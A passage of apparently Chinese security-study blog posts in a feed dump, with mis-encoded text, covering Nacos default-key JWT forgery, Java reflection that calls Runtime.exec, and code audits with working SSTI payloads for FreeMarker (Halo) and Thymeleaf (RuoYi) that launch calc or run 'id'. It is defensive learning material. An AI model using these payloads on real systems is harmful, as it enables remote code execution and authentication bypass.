title="æ¡ˆä¾‹2-Nacos-å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹"></a>æ¡ˆä¾‹2-Nacos-å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹</h3><p>ä¸‹è½½ï¼š<a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_50854662/article/details/129660330">https://blog.csdn.net/qq_50854662/article/details/129660330</a></p><p>å¯åŠ¨ï¼šstartup.cmd -m standalone</p><p>nacos.core.auth.plugin.nacos.token.secret.key</p><p>ç™»é™†æ—¶ä¿®æ”¹è¿”å›çš„JWTå€¼</p><p>æ­¤æ—¶ç”¨æˆ·ä¸ºnacos</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236505372-aa1d3047-c5dd-4112-9d8b-3ee4078a0534.png"></p><p>å¡«å†™å¯†é’¥ä¿®æ”¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236787541-c79ec6c7-d2cb-497a-b0da-516444fc4e09.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236831697-cf2701f5-24b1-413a-af0c-befbb3637eb5.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236895284-1ea569ad-421b-410d-bc6b-20e84137facb.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719236855236-d547a133-fdc7-4992-b0a2-9bc943e18d37.png"></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåå°„åŸºç¡€(äºŒ)</title>
      <link href="/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(2)/"/>
      <url>/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(2)/</url>
      
        <content type="html"><![CDATA[<h3 id="åå°„è°ƒç”¨"><a href="#åå°„è°ƒç”¨" class="headerlink" title="åå°„è°ƒç”¨"></a>åå°„è°ƒç”¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public void reflectMethod() &#123;</span><br><span class="line">        System.out.println(&quot;åå°„æµ‹è¯•æˆåŠŸ!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c = Class.forName(&quot;com.reflect.ReflectTest&quot;); // åˆ›å»ºClasså¯¹è±¡</span><br><span class="line">            Object m = c.newInstance(); // åˆ›å»ºç±»å®ä¾‹å¯¹è±¡</span><br><span class="line">            Method method = c.getMethod(&quot;reflectMethod&quot;); // è·å–reflectMethodæ–¹æ³•</span><br><span class="line">            method.invoke(m); // è°ƒç”¨ç±»å®ä¾‹å¯¹è±¡æ–¹æ³•</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742438547844-e8e66cf4-66ff-464d-bbe9-0875bc61a678.png"></p><h3 id="Java-åå°„-åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ"><a href="#Java-åå°„-åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ" class="headerlink" title="Java-åå°„-åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ"></a>Java-åå°„-åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ</h3><p>å¯ä»¥çœ‹åˆ°å…ˆåˆ›å»ºclasså¯¹è±¡å†åˆ›å»ºå®ä¾‹å¯¹è±¡ï¼Œå†è·å–å¯¹åº”æ–¹æ³•ï¼Œæœ€åå†è°ƒç”¨å°±å¯ä»¥æˆåŠŸè°ƒç”¨äº†ReflectTemoæ–¹æ³•ï¼Œé‚£ä¹ˆRuntimeæ˜¯å¦ä¹Ÿå¯ä»¥è¿™æ ·åå°„å‘¢ï¼Ÿ</p><p>æŒ‰ç…§è¯¥æ€è·¯ï¼Œè¿›è¡Œç¼–å†™ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        Object m = c1.newInstance();</span><br><span class="line">        Method method = c1.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">        method.invoke(m,&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æŠ¥é”™ï¼ŒåŸå› æ˜¯å› ä¸ºRuntimeç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°äº†å•ä¾‹æ¨¡å¼ã€‚æ¯”å¦‚å½“webåº”ç”¨æ¥è¯´ï¼Œæ•°æ®åº“è¿æ¥åªç”¨å»ºç«‹è¿æ¥ä¸€æ¬¡å°±å¯ä»¥ï¼Œè€Œä¸æ˜¯æ¯æ¬¡ç”¨åˆ°éƒ½æ–°å»ºè¿æ¥ï¼Œæ­¤æ—¶å°±å¯ä»¥å°†æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„æ„é€ æ–¹æ³•è®¾ç½®ä¸ºç§æœ‰ï¼Œä½¿ç”¨é™æ€æ–¹æ³•æ¥è·å–</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742439298652-25f08377-0cd0-4c9d-9cf7-6f5fee0a3057.png"></p><p>æ­¤æ—¶ä¸èƒ½newIntanceåˆ›å»ºç±»å¯¹è±¡ï¼Œå°±å¯ä»¥ä½¿ç”¨getMethodé€šè¿‡åå°„è·å–Runtimeç±»ä¸‹çš„execæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742439825643-aeb5f8a4-b4d7-4452-9ad0-445dff8e3dbf.png"></p><p>å¯ä»¥çœ‹åˆ°execæœ‰å…­ä¸ªé‡è½½æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªæœ€ç®€å•ï¼Œå°è¯•è·å–ç¬¬ä¸€ä¸ªã€‚</p><p>è¿™é‡Œå†è¯´ä¸‹invokeï¼Œinvokeä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">    Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">    Object runtime = getRuntimeMethod.invoke(clazz);</span><br><span class="line">    execMethod.invoke(runtime, &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742439936683-ada49339-924a-40ea-a720-7f82f610584d.png"></p><p>ç²¾ç®€ä¸€ä¸‹ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">c1.getMethod(&quot;exec&quot;, String.class).invoke(c1.getMethod(&quot;getRuntime&quot;).invoke(c1),&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹invokeï¼Œinvokeç¬¬ä¸€ä¸ªå‚æ•°ï¼š</p><p>å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ã€‚</p><p>å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç±»ã€‚</p><h3 id="Java-åå°„-è®¾ç½®setAccessible-true-æš´åŠ›è®¿é—®æƒé™"><a href="#Java-åå°„-è®¾ç½®setAccessible-true-æš´åŠ›è®¿é—®æƒé™" class="headerlink" title="Java-åå°„-è®¾ç½®setAccessible(true)æš´åŠ›è®¿é—®æƒé™"></a>Java-åå°„-è®¾ç½®setAccessible(true)æš´åŠ›è®¿é—®æƒé™</h3><p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æœºåˆ¶ä¸èƒ½å¯¹ç±»çš„ç§æœ‰privateå­—æ®µè¿›è¡Œæ“ä½œï¼Œç»•è¿‡ç§æœ‰æƒé™çš„è®¿é—®ã€‚ä½†ä¸€äº›ç‰¹æ®Šåœºæ™¯å­˜åœ¨ä¾‹å¤–çš„æ—¶å€™ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ï¼Œéœ€è¦å»è®¿é—®è¿™äº›å—é™çš„ç§æœ‰å­—æ®µï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨AccessibleObjectä¸Šçš„setAccessible()æ–¹æ³•æ¥å…è®¸è®¿é—®ã€‚</p><p>Java.lang.reflect.AccessibleObjectç±»æ˜¯Fieldï¼ŒMethodå’ŒConstructorç±»å¯¹è±¡çš„åŸºç±»ï¼Œå¯ä»¥æä¾›å°†åå°„å¯¹è±¡æ ‡è®°ä¸ºä½¿ç”¨å®ƒæŠ‘åˆ¶æ‘¸äººJavaè®¿é—®æ§åˆ¶æ£€æŸ¥çš„åŠŸèƒ½ï¼ŒåŒæ—¶ä¸Šè¿°çš„åå°„ç±»ä¸­çš„Fieldï¼ŒMethodå’ŒConstructorç»§æ‰¿è‡ªAccessibleObjectã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è¿™äº›ç±»æ–¹æ³•åŸºç¡€ä¸Šè°ƒç”¨setAccessible()æ–¹æ³•ï¼Œæ—¢å¯å¯¹è¿™äº›ç§æœ‰å­—æ®µè¿›è¡Œæ“ä½œã€‚</p><p>æ‰€æœ‰æˆ‘ä»¬æœ€å¼€å§‹çš„ä»£ç å†ä¿®æ”¹ç®€ç•¥ä¸‹ï¼Œå°±èƒ½æˆåŠŸå‘½ä»¤æ‰§è¡Œäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    Class c1= Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    Constructor m = c1.getDeclaredConstructor();</span><br><span class="line">    m.setAccessible(true);</span><br><span class="line">    c1.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> å®‰å…¨ç ”ç©¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaä»£ç å®¡è®¡-ssti</title>
      <link href="/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/"/>
      <url>/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="sstiæ¨¡ç‰ˆæ³¨å…¥"><a href="#sstiæ¨¡ç‰ˆæ³¨å…¥" class="headerlink" title="sstiæ¨¡ç‰ˆæ³¨å…¥"></a>sstiæ¨¡ç‰ˆæ³¨å…¥</h1><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904482502-73be4bb6-db76-4eff-8faf-3c55f54f9317.png"></p><h2 id="SSTIæ¨¡ç‰ˆæ³¨å…¥"><a href="#SSTIæ¨¡ç‰ˆæ³¨å…¥" class="headerlink" title="SSTIæ¨¡ç‰ˆæ³¨å…¥"></a>SSTIæ¨¡ç‰ˆæ³¨å…¥</h2><p>1ã€æ‰¾é¡¹ç›®ä¸­æ˜¯å¦å­˜åœ¨æ¨¡ç‰ˆå¼•æ“ï¼ˆç±»å‹åŠå®‰å…¨é—®é¢˜ï¼‰</p><p>2ã€æ‰¾æ¨¡ç‰ˆæ³¨å…¥åˆ©ç”¨å…¥å£æ¡ä»¶ï¼ˆæ ¹æ®ç½‘ä¸Šå·²çŸ¥æ¼æ´å¤ç°æ¡ä»¶ï¼‰</p><p>3ã€æ‰¾å¯æ§åœ°æ–¹è¿›è¡Œæµ‹è¯•æ£€æµ‹ï¼ˆæ ¹æ®ç½‘ä¸Šå·²çŸ¥æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼‰</p><h3 id="å¸¸è§æ¨¡ç‰ˆè¯´æ˜ï¼šè§ä¸Šå›¾"><a href="#å¸¸è§æ¨¡ç‰ˆè¯´æ˜ï¼šè§ä¸Šå›¾" class="headerlink" title="å¸¸è§æ¨¡ç‰ˆè¯´æ˜ï¼šè§ä¸Šå›¾"></a>å¸¸è§æ¨¡ç‰ˆè¯´æ˜ï¼šè§ä¸Šå›¾</h3><p>å‚è€ƒæ¥æºï¼š</p><p><a href="https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI">https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI</a></p><p>é»‘ç›’ä¸­å»ºè®®åˆ¤æ–­åˆ©ç”¨ï¼šè§70å¤©å†…å®¹</p><p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><p><a href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a></p><h3 id="JavaEEå®¡è®¡-CheckList"><a href="#JavaEEå®¡è®¡-CheckList" class="headerlink" title="JavaEEå®¡è®¡-CheckList"></a>JavaEEå®¡è®¡-CheckList</h3><p>1ã€åŠŸèƒ½ç‚¹-è§ä¸Šå›¾</p><p>2ã€æœç´¢ç‚¹-è§é“¾æ¥</p><p><a href="https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw">https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw</a></p><p><a href="https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg">https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg</a></p><p>ï¼ˆ1ï¼‰å›½äº§è½¯ä»¶</p><p>[æ³›å¾®Ecology] ä»£ç å®¡è®¡ã€å®‰è£…è¯´æ˜</p><p>[è‡´è¿œSeeyon] ä»£ç å®¡è®¡ã€è¡¥ä¸é—®é¢˜</p><p>[ç”¨å‹NC] ä»£ç å®¡è®¡ä¸ç¯å¢ƒæ­å»º</p><p>[è“å‡ŒLandray] ä»£ç å®¡è®¡ä¸ç¯å¢ƒæ­å»º</p><p>[æ³›å¾®E-Office] ä»£ç å®¡è®¡ä¸ç¯å¢ƒæ­å»º</p><p>[å¸†è½¯æŠ¥è¡¨] ä»£ç å®¡è®¡ä¸ç¯å¢ƒæ­å»º</p><p>[æ‹“å°”æ€TRS å†…å®¹åä½œå¹³å°WCM] ä»£ç å®¡è®¡ä¸ç¯å¢ƒæ­å»º</p><p>[é€šè¾¾OA] ä»£ç å®¡è®¡ä¸ç¯å¢ƒæ­å»º</p><p>[Smartbi] ä»£ç å®¡è®¡ä¸ç¯å¢ƒæ­å»º</p><p>[RuoYiè‹¥ä¾] ä»£ç å®¡è®¡</p><p>[é‡‘å±±ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ] ä»£ç å®¡è®¡</p><p>[æ…§ç‚¹OA] ä»£ç å®¡è®¡</p><p>[æµ™å¤§æ©ç‰¹å®¢æˆ·èµ„æºç®¡ç†ç³»ç»Ÿ] ä»£ç å®¡è®¡</p><p>[ä¼æœ›åˆ¶é€ ERP] ä»£ç å®¡è®¡</p><p>ï¼ˆ2ï¼‰å¸¸è§ç»„ä»¶</p><p>[ThinkPHP] ä»£ç å®¡è®¡</p><p>[Struts2] æ¼æ´ç¯å¢ƒä¸‹è½½ã€OGNL POCã€æ¼æ´åˆ†æ</p><p>[XStream] å®¡è®¡ç‰¹ç‚¹ä¸POCåˆ†æ</p><p>[NexusRepositoryManager] ä»£ç å®¡è®¡ä¸ç¯å¢ƒæ­å»º</p><p>ï¼ˆ3ï¼‰Server</p><p>Jetty</p><p>Nginx</p><p>Tomcat</p><p>WebLogic</p><p>JBoss</p><p>TongWeb</p><p>PrimetonPAS</p><p>ï¼ˆ4ï¼‰æ•°æ®åº“</p><p>mssql</p><p>mysql</p><p>H2 Database</p><p>CouchDB</p><p>ApacheSolr</p><p>ElasticSearch</p><p>InfluxDB</p><p>ApacheDruid</p><h3 id="FreeMarker-Halo"><a href="#FreeMarker-Halo" class="headerlink" title="#FreeMarker Halo"></a>#FreeMarker Halo</h3><p>freemarker-&gt;æ¨¡æ¿-&gt;admin&#x2F;themes&#x2F;editor-&gt;.ftl</p><p>&lt;#assign value&#x3D;â€freemarker.template.utility.Executeâ€?</p><p>new()&gt;${value(â€œcalc.exeâ€)}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719905283947-33b397a1-0d27-4b25-926c-d331871e9be4.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719935749356-1ba9881d-2fef-4518-8acb-132b6db9631b.png"></p><p>å¾€index.ftlé‡Œé¢æ’å…¥payload</p><p>&lt;#assign value&#x3D;â€freemarker.template.utility.Executeâ€?new()&gt; ${value(â€œcalc.exeâ€)}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719936427498-5bfb75a0-6599-46e7-97a0-2f4fb2caa7c1.png"></p><p>æ’å…¥ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719936716866-2500c079-60cf-43f0-b41a-e34b7df34925.png"></p><h3 id="Thymeleaf-Ruoyi"><a href="#Thymeleaf-Ruoyi" class="headerlink" title="#Thymeleaf Ruoyi"></a>#Thymeleaf Ruoyi</h3><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a></p><p>Thymeleaf-&gt;return å¯æ§å˜é‡-&gt;getNames-&gt;fragment-&gt;ç¼“å­˜ç›‘æ§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.<span class="title function_ invoke__">Scanner</span>(<span class="title function_ invoke__">T</span>(java.lang.Runtime).<span class="title function_ invoke__">getRuntime</span>().<span class="title function_ invoke__">exec</span>(<span class="string">&quot;id&quot;</span>).<span class="title function_ invoke__">getInputStream</span>()).<span class="title function_ invoke__">next</span>()&#125;__::.x</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719937509744-955f6b65-b66e-46a9-b399-0cb8861b1c30.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">GetMapping</span>(<span class="string">&quot;/path&quot;</span>)</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">path</span>(@RequestParam String lang) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938239847-b8274432-ddf6-4609-8244-fc0c4bb49b5b.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938182916-a8edd387-5018-4733-8455-f89b8ff679be.png"></p><p>æŠ“åŒ…åˆ†æä¸€ä¸‹<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938560525-c5051e71-ad99-42a4-98ac-c19fa5a7dbae.png"></p><p>ç‚¹å‡»ä¸€ä¸‹åˆ·æ–°æŒ‰é’®æŠ“åŒ…ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938578695-53b92c98-b1cb-49b0-8e09-1e901cd322b0.png"></p><p>æ³¨å…¥å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.<span class="title function_ invoke__">Scanner</span>(<span class="title function_ invoke__">T</span>(java.lang.Runtime).<span class="title function_ invoke__">getRuntime</span>().<span class="title function_ invoke__">exec</span>(<span class="string">&quot;calc&quot;</span>).<span class="title function_ invoke__">getInputStream</span>()).<span class="title function_ invoke__">next</span>()&#125;__::.x</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938966749-87c16d50-111e-416c-8ca9-54172198c0a1.png"></p><h3 id="Jeecg-Xxe-XSteam"><a href="#Jeecg-Xxe-XSteam" class="headerlink" title="#Jeecg-Xxe&amp;XSteam"></a>#Jeecg-Xxe&amp;XSteam</h3><p>xmlæ¯”è¾ƒå°‘ï¼Œé€æ¸è¢«jsonå–ä»£</p><p><a href="https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA">https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942427497-3672562f-26ab-4bdc-a482-9350cd5b41a5.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942417887-6849b494-23d8-4bba-929c-7eab028a512c.png"></p><p>ä½¿ç”¨äº†ç¬¬ä¸‰æ–¹ç»„ä»¶SAXReaderï¼Œé»˜è®¤çš„è§£ææ–¹æ³•ä¼šå‡ºç°XXE æ¼æ´ï¼Œæ¥ç€æŸ¥æ‰¾ç›¸åº”æ§åˆ¶å±‚çš„ä»£ç ï¼Œæ˜¯å¦è°ƒç”¨äº†è¯¥æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942394550-eb85234a-bd0c-45c1-91cd-1d0ce7c00b87.png"></p><h3 id="Halo-RCE-SSRF"><a href="#Halo-RCE-SSRF" class="headerlink" title="#Halo- RCE&amp;SSRF"></a>#Halo- RCE&amp;SSRF</h3><p>RuntimeUtil-&gt;remoteAddr-&gt;admin&#x2F;themes&#x2F;clone-&gt;åœ¨çº¿æ‹‰å–ä¸»é¢˜</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåå°„åŸºç¡€(ä¸€)</title>
      <link href="/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(1)/"/>
      <url>/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(1)/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaåå°„"><a href="#Javaåå°„" class="headerlink" title="Javaåå°„"></a>Javaåå°„</h1><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2023/png/25663185/1683432016646-0893cf9b-fd78-461b-8c17-8344efa880db.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2023/png/25663185/1683432045564-73a8c04a-6482-4cda-965a-23031f8be4d1.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2023/png/25663185/1683432053646-eeaaa8c8-9a62-42b3-ac08-42db3b5caecd.png"></p><h2 id="1ã€ä»€ä¹ˆæ˜¯Javaåå°„"><a href="#1ã€ä»€ä¹ˆæ˜¯Javaåå°„" class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯Javaåå°„"></a>1ã€ä»€ä¹ˆæ˜¯Javaåå°„</h2><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p><p>Javaæä¾›äº†ä¸€å¥—åå°„APIï¼Œè¯¥APIç”±Classç±»ä¸java.lang.reflectç±»åº“ç»„æˆã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740707673708-496bacc7-b5ff-4c07-8c9e-8ad2dc77791d.png"></p><p>è¯¥ç±»åº“åŒ…å«äº†Fieldã€Methodã€Constructorç­‰ç±»ã€‚</p><p>å¯¹æˆå‘˜å˜é‡ï¼Œæˆå‘˜æ–¹æ³•å’Œæ„é€ æ–¹æ³•çš„ä¿¡æ¯è¿›è¡Œçš„ç¼–ç¨‹æ“ä½œå¯ä»¥ç†è§£ä¸ºåå°„æœºåˆ¶ã€‚</p><h2 id="2ã€ä¸ºä»€ä¹ˆè¦ç”¨åˆ°åå°„"><a href="#2ã€ä¸ºä»€ä¹ˆè¦ç”¨åˆ°åå°„" class="headerlink" title="2ã€ä¸ºä»€ä¹ˆè¦ç”¨åˆ°åå°„"></a>2ã€ä¸ºä»€ä¹ˆè¦ç”¨åˆ°åå°„</h2><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p><p>å…¶å®ä»å®˜æ–¹å®šä¹‰ä¸­å°±èƒ½æ‰¾åˆ°å…¶å­˜åœ¨çš„ä»·å€¼ï¼Œåœ¨è¿è¡Œæ—¶è·å¾—ç¨‹åºæˆ–ç¨‹åºé›†ä¸­æ¯ä¸€ä¸ªç±»å‹çš„æˆå‘˜å’Œæˆå‘˜çš„ä¿¡æ¯ï¼Œä»è€ŒåŠ¨æ€çš„åˆ›å»ºã€ä¿®æ”¹ã€è°ƒç”¨ã€è·å–å…¶å±æ€§ï¼Œè€Œä¸éœ€è¦äº‹å…ˆçŸ¥é“è¿è¡Œçš„å¯¹è±¡æ˜¯è°ã€‚åˆ’é‡ç‚¹ï¼šåœ¨è¿è¡Œæ—¶è€Œä¸æ˜¯ç¼–è¯‘æ—¶ã€‚ï¼ˆä¸æ”¹å˜åŸæœ‰ä»£ç é€»è¾‘ï¼Œè‡ªè¡Œè¿è¡Œçš„æ—¶å€™åŠ¨æ€åˆ›å»ºå’Œç¼–è¯‘å³å¯ï¼‰</p><h2 id="3ã€åå°„æœºåˆ¶åº”ç”¨"><a href="#3ã€åå°„æœºåˆ¶åº”ç”¨" class="headerlink" title="3ã€åå°„æœºåˆ¶åº”ç”¨"></a>3ã€åå°„æœºåˆ¶åº”ç”¨</h2><p>å¼€å‘åº”ç”¨åœºæ™¯ï¼š</p><p>Springæ¡†æ¶çš„IOCåŸºäºåå°„åˆ›å»ºå¯¹è±¡å’Œè®¾ç½®ä¾èµ–å±æ€§ã€‚</p><p>SpringMVCçš„è¯·æ±‚è°ƒç”¨å¯¹åº”æ–¹æ³•ï¼Œä¹Ÿæ˜¯é€šè¿‡åå°„ã€‚</p><p>JDBCçš„Class#forName(String className)æ–¹æ³•ï¼Œä¹Ÿæ˜¯ä½¿ç”¨åå°„ã€‚</p><p>å®‰å…¨åº”ç”¨åœºæ™¯ï¼š</p><p>æ„é€ 